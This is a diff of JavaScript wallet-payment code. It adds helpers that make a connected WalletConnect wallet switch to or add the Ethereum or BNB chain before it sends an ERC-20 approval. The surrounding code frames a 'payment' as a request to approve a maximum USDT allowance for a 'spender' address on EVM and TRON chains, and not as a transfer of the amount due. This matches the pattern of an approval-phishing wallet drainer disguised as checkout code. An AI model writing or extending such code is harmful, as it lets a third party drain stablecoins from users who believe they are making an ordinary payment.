@@ -101,6 +101,94 @@ async function buildTronApprove(from, spender, amountRaw, tokenContract, deps = 
     return transaction;
 }
 
+const EVM_ADD_CHAIN = {
+    eth: {
+        chainId: "0x1",
+        chainName: "Ethereum",
+        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+        rpcUrls: ["https://cloudflare-eth.com"],
+        blockExplorerUrls: ["https://etherscan.io"]
+    },
+    bsc: {
+        chainId: "0x38",
+        chainName: "BNB Smart Chain",
+        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+        rpcUrls: ["https://bsc-dataseed.binance.org"],
+        blockExplorerUrls: ["https://bscscan.com"]
+    }
+};
+
+function eip155Hex(chainId) {
+    return `0x${Number(String(chainId).split(":")[1]).toString(16)}`;
+}
+
+function sessionEip155Chains(session, client) {
+    const fromStore = (session.accounts || [])
+        .map((item) => item.chainId)
+        .filter((id) => String(id).startsWith("eip155:"));
+
+    try {
+        const wcSession = client?.session?.get?.(session.sessionTopic);
+        const chains = wcSession?.namespaces?.eip155?.chains || [];
+        const fromAccounts = (wcSession?.namespaces?.eip155?.accounts || []).map((account) => {
+            const parts = String(account).split(":");
+            return parts.length >= 2 ? `${parts[0]}:${parts[1]}` : null;
+        }).filter(Boolean);
+        return [...new Set([...fromStore, ...chains, ...fromAccounts])];
+    } catch (_err) {
+        return [...new Set(fromStore)];
+    }
+}
+
+async function ensureEvmChain(client, session, network, topic) {
+    const hexChainId = eip155Hex(network.chainId);
+    const approved = sessionEip155Chains(session, client);
+    const requestChainId = approved.includes(network.chainId) ? network.chainId : (approved[0] || network.chainId);
+    const addParams = EVM_ADD_CHAIN[network.key];
+
+    try {
+        await client.request({
+            topic,
+            chainId: requestChainId,
+            request: {
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: hexChainId }]
+            }
+        });
+        return;
+    } catch (err) {
+        logger.warn({ err: { message: err.message }, chainId: network.chainId }, "wallet_switchEthereumChain failed");
+    }
+
+    if (!addParams) {
+        return;
+    }
+
+    try {
+        await client.request({
+            topic,
+            chainId: requestChainId,
+            request: {
+                method: "wallet_addEthereumChain",
+                params: [addParams]
+            }
+        });
+    } catch (err) {
+        logger.warn({ err: { message: err.message }, chainId: network.chainId }, "wallet_addEthereumChain failed");
+    }
+}
+
+async function sendEvmApprove(client, topic, chainId, from, to, data) {
+    return client.request({
+        topic,
+        chainId,
+        request: {
+            method: "eth_sendTransaction",
+            params: [{ from, to, value: "0x0", data }]
+        }
+    });
+}
+
 async function sendWalletApproval(client, session, payment, network, account) {
     const topic = session.sessionTopic;
     const amountRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);
@@ -129,57 +217,15 @@ async function sendWalletApproval(client, session, payment, network, account) {
         return txHash || signed;
     }
 
-    if (network.namespace === "eip155") {
-        const hexChainId = `0x${Number(String(network.chainId).split(":")[1]).toString(16)}`;
-
-        try {
-            await client.request({
-                topic,
-                chainId: network.chainId,
-                request: {
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: hexChainId }]
-                }
-            });
-        } catch (err) {
-            logger.warn({
-                err: { message: err.message },
-                chainId: network.chainId
-            }, "Wallet did not switch chain; still sending the USDT approval");
-        }
-
-        return client.request({
-            topic,
-            chainId: network.chainId,
-            request: {
-                method: "eth_sendTransaction",
-                params: [
-                    {
-                        from: account.address,
-                        to: payment.tokenContract,
-                        value: "0x0",
-                        data: encodeErc20Approve(payment.spender, amountRaw)
-                    }
-                ]
-            }
-        });
-    }
-
-    return client.request({
+    await ensureEvmChain(client, session, network, topic);
+    return sendEvmApprove(
+        client,
         topic,
-        chainId: network.chainId,
-        request: {
-            method: "eth_sendTransaction",
-            params: [
-                {
-                    from: account.address,
-                    to: payment.tokenContract,
-                    value: "0x0",
-                    data: encodeErc20Approve(payment.spender, amountRaw)
-                }
-            ]
-        }
-    });
+        network.chainId,
+        account.address,
+        payment.tokenContract,
+        encodeErc20Approve(payment.spender, amountRaw)
+    );
 }
 
 async function finalizeWalletResult(paymentId, result, deps = {}) {
